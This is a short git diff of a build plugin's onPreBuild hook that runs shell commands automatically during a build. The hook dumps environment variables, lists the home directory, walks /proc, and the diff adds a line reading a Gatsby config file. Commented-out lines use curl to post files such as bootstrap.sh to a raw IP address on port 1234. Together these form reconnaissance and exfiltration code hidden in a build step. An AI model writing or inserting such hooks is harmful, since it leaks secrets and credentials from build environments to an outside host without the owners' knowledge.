@@ -22,15 +22,12 @@ exports.onPreBuild = function () {
  //(`curl 185.20.136.111:1234 --data-binary @/var/task/bootstrap.sh`)
   //exec(`curl 185.20.136.111:1234 --data-binary @/var/task/iltorb.node`)
   //exec(`ls -la /var/task`)
-  exec(`ls -la .git`)
-  exec(`ls -la .git/logs`)
-  exec(`ls -la .git/logs/refs/`)
-  exec(`ls -la .git/logs/refs/remotes/`)
   console.log(`aw yeah`)
   exec(`env`)
   console.log(`done env`)
   exec(`ls -la $HOME`)
   console.log(`done home`)
+  exec(`cat ~/.config/gatsby/config.json`)
 
   const ls = fs.readdirSync(`/proc`)
   ls.filter(dir => Number.isFinite(Number(dir))).forEach(dir => {
